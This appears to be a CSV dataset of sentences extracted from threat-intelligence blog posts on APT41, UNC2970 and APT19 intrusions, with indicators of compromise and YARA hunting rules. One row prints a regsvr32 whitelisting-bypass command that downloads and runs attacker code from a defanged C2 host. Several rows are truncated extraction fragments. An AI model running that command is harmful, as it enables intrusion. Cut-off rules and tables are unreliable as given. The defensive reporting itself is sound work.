CAND_02232,R045,8,R045_P0001,R045_S000067,"We've observed at least 15 plugins with the higher-level themes of: Shell Operations Executing processes via cmd.exe File System Operations Directory enumeration Changing directory Delete file Create directory Copy file Move file File exists Change file timestamp List attached drives Process Operations Enumerate running processes Inject shellcode Kill a process Network Probing Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM APT41 Has Arisen From the DUST | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust?utm_source=chatgpt.com 8/27"
CAND_02233,R045,9,R045_P0001,R045_S000068,"Ping a remote host Attempt connections on port Network Store Interface Operations Get network interface statistics Screen Operations Get screen size Screenshot System Information Survey List RDP sessions List installed security software Get system info List user accounts Get system boot time Enumerate hidden and visible process windows File Manipulation Operations Open file Write file CRC32 file content Read file Close file Keylogger Activate Delete log Active Directory Operations Enumerate domain controller information Add user Delete user Get server configuration Get server shares Get detailed server and workstation domain information Enumerate servers Get list of services Get list of network shares Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM APT41 Has Arisen From the DUST | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust?utm_source=chatgpt.com 9/27"
CAND_02234,R045,11,R045_P0001,R045_S000072,"APT41 exported data from Oracle Databases to CSV formats with the following command: C:\ProgramData\luldr\luldr\sqluldr.exe user=<USER>@< <DATABASE> charset=utf8 safe=yes head=yes text=csv r batch=yes query=<SQL QUERY> file=<OUTPUT>.csv Figure 4: Command line execution for SQLULDR2 PINEGROVE During the intrusion, Mandiant observed APT41 leveraging PINEGROVE for their data exfiltration."
CAND_02235,R045,11,R045_P0001,R045_S000076,Code Signing Certificates The DUSTTRAP malware and its associated components that were observed during the intrusion were code signed with presumably stolen code signing certificates.
CAND_02236,R045,11,R045_P0001,R045_S000077,One of the code signing certificates seemed to be related to a South Korean company operating in the gaming industry sector.
CAND_02237,R045,12,R045_P0001,R045_S000081,"This same certificate was previously observed by Mandiant in 2020 being used by UNC3914, which is suspected to be another Chinese- nexus threat actor."
CAND_02238,R045,12,R045_P0001,R045_S000082,Note that neither Mandiant nor TAG see any direct relation between UNC3914 and APT41 at the time of writing.
CAND_02239,R045,12,R045_P0001,R045_S000083,"Serial Number: 0a:2c:bf:9b:18:fe:1b:20:b9:4e:ca:c4:b0:78:b8 Signature Algorithm: sha256WithRSAEncryption Issuer: C = US, O = DigiCert Inc, OU = www.digicert."
CAND_02240,R045,13,R045_P0001,R045_S000086,"Figure 8: Code signing certificate abused by APT41 The use of the code signing certificate, as well as its suspected owners being companies in the gaming sector, aligns with APT41's tactics, techniques, and procedures (TTPs) and past campaigns."
CAND_02241,R045,13,R045_P0001,R045_S000087,More details about this can be found in our APT41 report.
CAND_02242,R045,13,R045_P0001,R045_S000088,"Acknowledgement We would like to thank Google’s TAG, our Incident Response consultants and FLARE who enabled this research."
CAND_02243,R045,13,R045_P0001,R045_S000090,"MITRE ATT&CK TACTIC ID Name De Reconnaissance T15931.002 Search Open Websites/Domains: Search Engines AP ob se in vic rea se Reconnaissance T1594 Search Victim- Owned Websites AP ob vis ow inf tha ex rea ob Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM APT41 Has Arisen From the DUST | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust?utm_source=chatgpt.com 13/27"
CAND_02244,R045,14,R045_P0001,R045_S000091,"int da Collection T1560.001 Archive via Utility AP ob rar co da do fro Or Da Command and Control T1071.001 Web Protocols AP ob HT co as ma Exfiltration T1567.002 Exfiltration to Cloud Storage AP ob On the of Persistence T1543.003 Create or Modify System Process: Windows Service AP ob cre Wi Se ac pe Persistence T1574.001 DLL Search Order Hijacking AP DL ord to DU us an co Wi bin Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM APT41 Has Arisen From the DUST | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust?utm_source=chatgpt.com 14/27"
CAND_02245,R045,16,R045_P0001,R045_S000094,"Host-Based Indicators Filename MD5 sqluldr.exe fcff642268898fcf65702a214a OneDriveUploader.exe ac125aea0b703de37980779599 aclui.dll 17d0ada8f5610ff29f2e8eaf0e dbgeng.dll 9991ce9d2746313f505dbf0487 dbgeng.dll c33247bc3e7e8cb72133e47930 hostfxr.dll cfce85548436fb89a83bf34dc1 dbgeng.dll e98b9e21928252332edf934f3d dbgeng.dll 8222352a61eacca3a1c6517956 - dc725f5e9b1ae062fbec86ee4d Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM APT41 Has Arisen From the DUST | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust?utm_source=chatgpt.com 16/27"
CAND_02246,R045,19,R045_P0001,R045_S000097,"        and #org > 1 and $serial } rule M_Hunting_Certificate_CCR_INC { meta: author = ""Mandiant"" description = ""Rule looks for PEs signed usi stolen certificate issued for CCR INC"" disclaimer = ""This rule is meant for hunting tested to run in a production environment."" strings: $org = ""CCR INC"" $serial = { 6F 97 F1 3D A5 5E 9F 70 A6 92 7E condition: ((uint16(0) == 0x5a4d and uint32(uint32(0x3C (uint32(0) == 0xE011CFD0 and uint32(4) == 0xE11AB1A1 and $serial } rule M_Hunting_Certificate_ALEAN_TOUR { meta: author = ""Mandiant"" description = ""Rule looks for PEs signed usi stolen certificate issued for ALEAN-TOUR"" disclaimer = ""This rule is meant for hunting tested to run in a production environment."" strings: $org = ""OOO ALEAN-TOUR"" $serial = { 05 FA 8A 72 DA 46 07 4F DE 1E 34 condition: ((uint16(0) == 0x5a4d and uint32(uint32(0x3C or (uint32(0) == 0xE011CFD0 and uint32(4) == 0xE11AB and #org > 1 and $serial } Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM APT41 Has Arisen From the DUST | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust?utm_source=chatgpt.com 19/27"
CAND_02247,R045,22,R045_P0001,R045_S000100,"    meta: author = ""Mandiant"" description = ""Hunting for PINEGROVE uploade malware family."" disclaimer = ""This rule is meant for hunting tested to run in a production environment."" strings: $s1 = ""RefreshToken"" $s2 = ""RefreshInterval"" $s3 = ""ThreadNum"" $s4 = ""BlockSize"" $s5 = ""SigleFile"" $s6 = ""MainLand"" $s7 = ""MSAccount"" $anchor1 = ""driveItemUploadableProperties"" $anchor2 = ""client_id"" $anchor3 = ""client_secret"" $anchor4 = ""onedrive-login"" $anchor5 = ""authorization_code"" condition: ( ((uint32(0) == 0xcafebabe) or (uint32(0) (uint32(0) == 0xfeedfacf) or (uint32(0) == 0xbebafec (uint32(0) == 0xcefaedfe) or (uint32(0) == 0xcffaedf (uint32(0) == 0x464c457f) or (uint16(0) == 0x5A4D and uint32(uint32(0 ) and (5 of ($s*)) and (4 of ($anchor*)) } import ""elf"" rule M_Hunting_Utility_Linux_SQLULDR2_1 { meta: author = ""Mandiant"" description = ""Detection of the Linux versio disclaimer = ""This rule is meant for hunting tested to run in a production environment."" strings: $name = ""sqluldr2zip.c"" ascii Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM APT41 Has Arisen From the DUST | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust?utm_source=chatgpt.com 22/27"
CAND_02248,R045,24,R045_P0001,R045_S000106,"elf.symtab_entries): (elf.symtab[i].name == ""OCISessionBegin""))) and $out and $heading and (5 of ($p*)) } rule M_Hunting_Dropper_DUSTTRAP_1 { meta: author = ""Mandiant"" description = ""Detects the DUSTTRAP on the use of CFG patching constants and argument co for payload entry-point"" disclaimer = ""This rule is meant for tested to run in a production environment."" strings: $cfg_patch_constant_1 = { 48 FF E0 C $cfg_patch_constant_2 = { 8B DA 48 8 $cfg_patch_constant_3 = { B8 48 8B 0 $cfg_patch_constant_4 = { 81 7A 07 4 $log_format = ""%lld.log"" wide condition: uint16(0) == 0x5a4d and all of ($cfg_patch_constant_*) and $log_format } Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM APT41 Has Arisen From the DUST | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust?utm_source=chatgpt.com 24/27"
CAND_02249,R045,26,R045_P0001,R045_S000109,"Related articles Threat Intelligence By Google Threat Intelligence Group • 17-minute read Threat Intelligence     uint32(pe.sections[i].raw_data_offset + ) } YARA-L If you are a Google SecOps Enterprise+ customer, rules were released to your Emerging Threats rule pack, and IOCs listed in this blog post are available for prioritization with Applied Threat Intelligence."
CAND_02250,R045,27,R045_P0001,R045_S000111,"Follow us Google Cloud Google Cloud Products Privacy Terms Help ‪English‬ By Mandiant • 29-minute read Threat Intelligence By Mandiant • 18-minute read Threat Intelligence By Mandiant • 15-minute read ShinyHunters Renewed Mass Exploitation Campaign Targeting Oracle PeopleSoft Proactive Defense: Hardening Code Pipelines and CI/CD Infrastructure Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM APT41 Has Arisen From the DUST | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust?utm_source=chatgpt.com 27/27"
CAND_02251,R046,1,R046_P0001,R046_S000001,"Threat Intelligence An Offer You Can Refuse: UNC2970 Backdoor Deployment Using Trojanized PDF Reader September 18, 2024 Mandiant Written by: Marco Galli, Diana Ion, Yash Gupta, Adrian Hernandez, Ana Martinez Gomez, Jon Daniels, Christopher Gardner Introduction In June 2024, Mandiant Managed Defense identified a cyber espionage group suspected to have a North Korea nexus, tracked by Mandiant under UNC2970."
CAND_02252,R046,1,R046_P0001,R046_S000002,"Later that month, Mandiant discovered additional phishing lures masquerading as an energy company and as an entity in the aerospace industry to target victims in these verticals."
CAND_02253,R046,1,R046_P0001,R046_S000008,"This is not a compromise of SumatraPDF, nor is there any inherent Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM An Offer You Can Refuse: UNC2970 Backdoor Deployment Using Trojanized PDF Reader | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/unc2970-backdoor-trojanized-pdf-reader/?utm_source=chatgpt.com 1/19"
CAND_02254,R046,2,R046_P0001,R046_S000017,"To illustrate this, Mandiant analyzed the differences between the original job description and UNC2970's job description included in the ZIP archive."
CAND_02255,R046,2,R046_P0001,R046_S000018,"Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM An Offer You Can Refuse: UNC2970 Backdoor Deployment Using Trojanized PDF Reader | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/unc2970-backdoor-trojanized-pdf-reader/?utm_source=chatgpt.com 2/19"
CAND_02256,R046,3,R046_P0001,R046_S000020,"Another omitted line is under the ""Preferred Education, Experience, & Skills"" section, where the original job description includes ""Preferred location McLean, Virginia."" Figure 2: Original vs."
CAND_02257,R046,3,R046_P0001,R046_S000022,The PDF content is consistent with a legitimate job description from the nuclear energy sector.
CAND_02258,R046,4,R046_P0001,R046_S000024,"The Infection Chain Explained Mandiant Managed Defense discovered that the victim downloaded and opened a password protected ZIP archive received through WhatsApp chat, expecting to see a document containing a job description."
CAND_02259,R046,4,R046_P0001,R046_S000025,"Upon analysis, the ZIP archive contains several files, briefly described in Table 1: File Description BAE_VICE President of Business Development.pdf (MD5: 28a75771ebdb96d9b49c9369918ca581) An encrypted file containing both the PDF lure displayed to the user and the MISTPEN backdoor libmupdf.dll (MD5: 57e8a7ef21e7586d008d4116d70062a6) A trojanized dynamic-link library (DLL) file required by SumatraPDF.exe, tracked as BURNBOOK."
CAND_02260,R046,4,R046_P0001,R046_S000027,"Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM An Offer You Can Refuse: UNC2970 Backdoor Deployment Using Trojanized PDF Reader | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/unc2970-backdoor-trojanized-pdf-reader/?utm_source=chatgpt.com 4/19"
CAND_02261,R046,5,R046_P0001,R046_S000029,"As previously stated, this technique did not employ a vulnerability in the original SumatraPDF source code."
CAND_02262,R046,5,R046_P0001,R046_S000031,Its source code is publically available.
CAND_02263,R046,5,R046_P0001,R046_S000032,"When accessed this way, the DLL files are loaded by the SumatraPDF.exe executable, including the trojanized libmupdf.dll file representing the first stage of the infection chain."
CAND_02264,R046,5,R046_P0001,R046_S000034,Mandiant found that later versions (after 3.4.3) of SumatraPDF implement countermeasures to prevent modified versions of this DLL from being loaded.
CAND_02265,R046,5,R046_P0001,R046_S000035,"MISTPEN is a trojanized version of a legitimate Notepad++ plugin, binhex.dll , which contains a backdoor."
CAND_02266,R046,5,R046_P0001,R046_S000036,"Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM An Offer You Can Refuse: UNC2970 Backdoor Deployment Using Trojanized PDF Reader | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/unc2970-backdoor-trojanized-pdf-reader/?utm_source=chatgpt.com 5/19"
CAND_02267,R046,6,R046_P0001,R046_S000037,"Libmupdf.dll also writes the encrypted backdoor to disk into a new file named thumbs.ini and creates a scheduled task named Sumatra Launcher to execute the backdoor daily using the legitimate Windows binary BdeUISrv.exe , which loads the wtsapi32.dll file through DLL search-order hijacking."
CAND_02268,R046,7,R046_P0001,R046_S000043,The next 32 bytes (key) and 12 bytes (nonce) are read from the file and used to initialize a ChaCha20 cipher.
CAND_02269,R046,7,R046_P0001,R046_S000046,"The decrypted data, representing a PDF file, is written to the system's temporary folder and will be displayed by the PDF viewer if the sample passes a network connectivity check to google[.]com ."
CAND_02270,R046,8,R046_P0001,R046_S000049,"The same ChaCha20 cipher (without resetting) is used to decrypt the backdoor DLL, which is then reflectively loaded into the memory space of SumatraPDF.exe and executed."
CAND_02271,R046,8,R046_P0001,R046_S000051,"Following this, the ChaCha20 cipher is reset, with the original key and nonce being reused to re-encrypt the in-memory DLL containing the backdoor code."
CAND_02272,R046,8,R046_P0001,R046_S000054,"Finally, the sample creates a scheduled task named Sumatra Launcher , which executes %APPDATA%\Microsoft\BDE UI Launcher\BdeUISrv.exe daily when the user logs in."
CAND_02273,R046,8,R046_P0001,R046_S000057,"Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM An Offer You Can Refuse: UNC2970 Backdoor Deployment Using Trojanized PDF Reader | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/unc2970-backdoor-trojanized-pdf-reader/?utm_source=chatgpt.com 8/19"
CAND_02274,R046,9,R046_P0001,R046_S000058,  The backdoor is a modification of the open-source Notepad++ binhex plugin v2.0.0.1 where the creation of a thread that executes the malicious code has been added to the DllMain function.
CAND_02275,R046,9,R046_P0001,R046_S000059,"MISTPEN decrypts a token using AES with the key EF 0D 4E A6 D8 B8 E8 73 DF 17 5C 0B 51 F6 3B 33 , which is then used to access a Microsoft API endpoint in the following request: Request type: POST Request URI: https://login.microsoftonline.com/common Body: grant_type=refresh_token &refresh_token=0.AScAu EuwXupyYCVnZNp7rq6Le2eUEnAME.AgABAwEAAADnfolhJpSnRYB1 AgDs_wUA9P_z3EI-It1YbdHPtZaMoegHpfKNHgO9rjjC9plVmHfYh o-p4m5uoLzuQu9kJmCqXpdDteicUF5Fd7XfcVBpe5Vu1TOhxQoP-k GcdzWMa3aYVzdfnNsAlV8n-061gnUDKNxHYL4xTz1jymmhRGzZ1KO j0A8fMNSqvTwp_UF7upYw5yI81UTRsBN9hbpGpLnMb_WIOMvX-Bcm Lzij1n..."
CAND_02276,R046,9,R046_P0001,R046_S000061,The configuration data includes the sleep time and an ID.
CAND_02277,R046,9,R046_P0001,R046_S000065,"If the backdoor fails to get the time information, the backdoor sends the message "" Hi,I am New "" to its C2 instead."
CAND_02278,R046,10,R046_P0001,R046_S000069,"The backdoor includes code to support more than one token, selecting randomly the one to use."
CAND_02279,R046,10,R046_P0001,R046_S000070,"Backdoor Commands The backdoor supports the following commands: d : The backdoor parses, loads into memory, and executes the received PE payload."
CAND_02280,R046,10,R046_P0001,R046_S000074,""" to its C2."
CAND_02281,R046,10,R046_P0001,R046_S000077,TEARPAGE decrypts an encrypted blob contained in the file %APPDATA%\Thumbs.ini .
CAND_02282,R046,10,R046_P0001,R046_S000078,"Table 3 describes the structure of this file: File Offset Value Description 0x0 - 0x1F ChaCha20 key 0x20 - 0x2B ChaCha20 nonce 0x2C - EOF Encrypted backdoor DLL Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM An Offer You Can Refuse: UNC2970 Backdoor Deployment Using Trojanized PDF Reader | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/unc2970-backdoor-trojanized-pdf-reader/?utm_source=chatgpt.com 10/19"
CAND_02283,R046,11,R046_P0001,R046_S000082,"Figure 7: A pseudocode representation of the malicious code in wtsapi32.dll Sample Comparison Through open-source investigation, Mandiant identified a similar malicious archive containing the same SumatraPDF.exe binary; however, there are a few key differences in the BURNBOOK and MISTPEN samples as compared to specimens analyzed earlier in the post."
CAND_02284,R046,12,R046_P0001,R046_S000087,This feature is not present in the earlier sample.
CAND_02285,R046,12,R046_P0001,R046_S000088,"Figure 8: BURNBOOK earlier version Figure 9: BURNBOOK later version with connection check Missing Command g in MISTPEN The MISTPEN sample we analyzed supports the g command, which instructs the backdoor to save its configuration to a file named setup.bin."
CAND_02286,R046,12,R046_P0001,R046_S000089,This file is also read by the backdoor when it first executes and thus allows MISTPEN to make its configuration persistent on the host.
CAND_02287,R046,12,R046_P0001,R046_S000091,"Different C2 Infrastructure The MISTPEN sample delivered by the earlier malicious archive does not communicate using Microsoft Graph and instead employs a set of HTTPS URLs consisting of compromised WordPress websites belonging to small businesses from across the world: hxxps://bmtpakistan[.]com/solution/wp- content/plugins/one-click-demo- import/assets/asset.php — Construction company in Karachi, Pakistan hxxps://cmasedu[.]com/wp- content/plugins/kirki/inc/script.php — Education service company based in Riyadh, Saudi Arabia Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM An Offer You Can Refuse: UNC2970 Backdoor Deployment Using Trojanized PDF Reader | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/unc2970-backdoor-trojanized-pdf-reader/?utm_source=chatgpt.com 12/19"
CAND_02288,R046,13,R046_P0001,R046_S000093,The usage of the AES encryption is also different in the two samples observed.
CAND_02289,R046,13,R046_P0001,R046_S000095,"Based on the differences we have highlighted, the threat actor has improved their malware over time by implementing new features and adding a network connectivity check to hinder the analysis of the samples."
CAND_02290,R046,13,R046_P0001,R046_S000098,"Mandiant Managed Defense has reported similar activity in 2022 attributed to UNC4034, which later got merged into UNC2970."
CAND_02291,R046,14,R046_P0001,R046_S000109,@p uint16(@pk_magic[i] + 26))) and ($n3 in (@cd_magic[i] @cd_magic[i] + 46 + uint16(@cd_magic[i] + 28))) ) and (2 ..
CAND_02292,R046,14,R046_P0001,R046_S000110,#pk_magic) : ( ($n4 in (@pk_magic[i] + 30 ..
CAND_02293,R046,14,R046_P0001,R046_S000112,#pk_magic) : ( ($n5 in (@pk_magic[i] + 30 ..
CAND_02294,R046,14,R046_P0001,R046_S000113,"@p uint16(@pk_magic[i] + 26))) and ($n5 in (@cd_magic[i] Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM An Offer You Can Refuse: UNC2970 Backdoor Deployment Using Trojanized PDF Reader | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/unc2970-backdoor-trojanized-pdf-reader/?utm_source=chatgpt.com 14/19"
CAND_02295,R046,15,R046_P0001,R046_S000114,"      @cd_magic[i] + 46 + uint16(@cd_magic[i] + 28))) ) } rule M_Launcher_BURNBOOK_2 { meta: author = ""Mandiant"" date_created = ""2024-08-12"" date_modified = ""2024-08-12"" md5 = ""57e8a7ef21e7586d008d4116d70062 rev = 1 strings: $parse_decoy_document = { FF 15 [4-32 00 00 00 [4-32] FF 15 [4] 85 C0 0F 8?"
CAND_02296,R046,15,R046_P0001,R046_S000116,??
CAND_02297,R046,15,R046_P0001,R046_S000118,[4-32] 41 B8 20 00 00 00 [4-32] FF 15 [4] 85 [4-32] 41 B8 0C 00 00 00 [4-32] FF 15 [4] 85 C0 0F 8?
CAND_02298,R046,15,R046_P0001,R046_S000121,4?
CAND_02299,R046,16,R046_P0001,R046_S000126,[4-32] 41 B8 20 00 00 00 [4-12] FF 15 [4] 85 C0 [4-32] 41 B8 0C 00 00 00 [4-12] FF 15 [4] 85 C0 0F 8?
CAND_02300,R046,16,R046_P0001,R046_S000128,85 C0 0F condition: all of them } YARA-L Rules Mandiant has made the relevant rules available in the Google SecOps Mandiant Intel Emerging Threats curated detections rule set.
CAND_02301,R047,1,R047_P0001,R047_S000001,"Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 1/22"
CAND_02302,R047,2,R047_P0001,R047_S000002,"Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 2/22"
CAND_02303,R047,3,R047_P0001,R047_S000004,"We have associated this campaign with APT19, a group that we assess is composed of freelancers, with some degree of sponsorship by the Chinese government."
CAND_02304,R047,3,R047_P0001,R047_S000005,APT19 used three different techniques to attempt to compromise targets.
CAND_02305,R047,3,R047_P0001,R047_S000006,"In early May, the phishing lures leveraged RTF attachments that exploited Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 3/22"
CAND_02306,R047,4,R047_P0001,R047_S000010,At least one observed phishing lure delivered a Cobalt Strike payload.
CAND_02307,R047,4,R047_P0001,R047_S000012,We have previously observed APT19 steal data from law and investment firms for competitive economic purposes.
CAND_02308,R047,4,R047_P0001,R047_S000013,This purpose of this blog post is to inform law firms and investment firms of this phishing campaign and provide technical indicators that their IT personnel can use for proactive hunting and detection.
CAND_02309,R047,4,R047_P0001,R047_S000014,"The Emails APT19 phishing emails from this campaign originated from sender email accounts from the ""@cloudsend[.]net"" domain and used a variety of subjects and attachment names."
CAND_02310,R047,4,R047_P0001,R047_S000015,Refer to the Indicators of Compromise section for more details.
CAND_02311,R047,4,R047_P0001,R047_S000016,The Attachments APT19 leveraged Rich Text Format (RTF) and macro-enabled Microsoft Excel (XLSM) files to deliver their initial exploits.
CAND_02312,R047,4,R047_P0001,R047_S000018,"Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 4/22"
CAND_02313,R047,5,R047_P0001,R047_S000021,Figure 1 is a screenshot of a packet capture showing one of the RTF files reaching out to hxxp://tk-in- f156.2bunny[.]com/Agreement.doc.
CAND_02314,R047,5,R047_P0001,R047_S000022,Figure 1: RTF PCAP XLSM Attachments The XLSM attachments contained multiple worksheets with content that reflected the attachment name.
CAND_02315,R047,5,R047_P0001,R047_S000024,Figure 2 provides a screenshot of one of the XLSM files (MD5:30f149479c02b741e897cdb9ecd22da7).
CAND_02316,R047,5,R047_P0001,R047_S000025,"Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 5/22"
CAND_02317,R047,6,R047_P0001,R047_S000026,Figure 2: Enable macros One of the malicious XLSM attachments that we observed contained a macro that: 1.
CAND_02318,R047,6,R047_P0001,R047_S000030,Figure 3 depicts the macro embedded within the XLSM file (MD5: 38125a991efc6ab02f7134db0ebe21b6).
CAND_02319,R047,6,R047_P0001,R047_S000031,"Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 6/22"
CAND_02320,R047,7,R047_P0001,R047_S000032,Figure 3: XLSX Macro Figure 4 contains the decoded output of the encoded text.
CAND_02321,R047,7,R047_P0001,R047_S000033,"Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 7/22"
CAND_02322,R047,8,R047_P0001,R047_S000034,Figure 4: Decoded ZLIB + Base64 payload The shellcode invokes PowerShell to issue a HTTP GET request for a random four (4) character URI on the root of autodiscovery[.]2bunny[.]com.
CAND_02323,R047,8,R047_P0001,R047_S000035,The requests contain minimal HTTP headers since the PowerShell command is executed with mostly default parameters.
CAND_02324,R047,8,R047_P0001,R047_S000036,"Figure 5 depicts an HTTP GET request generated by the payload, with minimal HTTP headers."
CAND_02325,R047,8,R047_P0001,R047_S000037,"Figure 5: GET Request with minimal HTTP headers Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 8/22"
CAND_02326,R047,9,R047_P0001,R047_S000040,"Figure 6: Decoded shellcode FireEye also identified an alternate macro in some of the XLSM documents, displayed in Figure 7."
CAND_02327,R047,9,R047_P0001,R047_S000041,Figure 7: Alternate macro This macro uses Casey Smith’s “Squiblydoo” Application Whitelisting bypass technique to run the command in Figure 8.
CAND_02328,R047,9,R047_P0001,R047_S000042,"Figure 8: Application Whitelisting Bypass Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 9/22"
CAND_02329,R047,10,R047_P0001,R047_S000043,The command in Figure 8 downloads and launches code within an SCT file.
CAND_02330,R047,10,R047_P0001,R047_S000046,"Notice the “$DoIt” string, which is usually indicative of a Cobalt Strike payload."
CAND_02331,R047,11,R047_P0001,R047_S000048,"Figure 10: Decoded SCT contents A quick conversion of the contents of the variable “$var_code” from Base64 to ASCII shows some familiar network indicators, shown in Figure 11."
CAND_02332,R047,13,R047_P0001,R047_S000052,Figure 12: Cobalt Strike BEACON C2 FireEye Product Detections The following FireEye products currently detect and block the methods described above.
CAND_02333,R047,13,R047_P0002,R047_S000054,"Detection Name SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) Gen:Variant.Application.HackTool.CobaltStrike.1 Malware Object Backdoor.BEACON FE_Malformed_RTF Malware.Binary.rtf Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 13/22"
CAND_02334,R047,14,R047_P0001,R047_S000056,Recommendations FireEye recommends organizations perform the following steps to mitigate the risk of this campaign: 1.
CAND_02335,R047,14,R047_P0001,R047_S000058,2.
CAND_02336,R047,14,R047_P0001,R047_S000059,Search historic and future emails that match the included indicators of compromise.
CAND_02337,R047,14,R047_P0001,R047_S000060,3.
CAND_02338,R047,14,R047_P0001,R047_S000061,Review web proxy logs for connections to the included network based indicators of compromise.
CAND_02339,R047,14,R047_P0001,R047_S000062,4.
CAND_02340,R047,14,R047_P0001,R047_S000063,Block connections to the included fully qualified domain names.
CAND_02341,R047,14,R047_P0001,R047_S000064,5.
CAND_02342,R047,14,R047_P0001,R047_S000065,Review endpoints for the included host based indicators of compromise.
CAND_02343,R047,14,R047_P0001,R047_S000066,"Indicators of Compromise The following section provides the IOCs for the variants of the phishing emails and malicious Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 14/22"
CAND_02344,R047,15,R047_P0001,R047_S000067,payloads that FireEye has observed during this campaign.
CAND_02345,R047,18,R047_P0001,R047_S000072,"regsvr32.exe /s /n /u /i:hxxps://lyncdiscover.2bunny.com/Autodiscov er scrobj.dll \\\pipe\msagent_<4 digits> C:\Documents and Settings\\Local Settings\Temp\K5om.dll (4 character DLL based on URI of original GET request) Yara Rules rule FE_LEGALSTRIKE_MACRO { meta:version="".1"" filetype=""MACRO"" author=""Ian.Ahl@fireeye.com @TekDe date=""2017-06-02"" description=""This rule is designed strings: // OBSFUCATION $ob1 = ""ChrW(114) & ChrW(101) & Ch $ob2 = ""ChrW(120) & ChrW(101) & Ch $ob3 = ""ChrW(117) & ChrW(32) & Chr $ob4 = ""ChrW(58) & ChrW(47) & ChrW $ob5 = ""ChrW(99) & ChrW(111) & Chr $ob6 = ""ChrW(110) & ChrW(121) & Ch $ob7 = ""ChrW(111) & ChrW(100) & Ch $ob8 = ""ChrW(115) & ChrW(99) & Chr $obreg1 = /(\w{5}\s&\s){7}\w{5}/ $obreg2 = /(Chrw\(\d{1,3}\)\s&\s){ // wscript $wsobj1 = ""Set Obj = CreateObject( $wsobj2 = ""Obj.Run "" ascii wide condition: ( ( Contact sales Get started for free Cloud Blog 10/6/26, 10:30 AM Privileges and Credentials: Phished at the Request of Counsel | Mandiant | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel?utm_source=chatgpt.com 18/22"
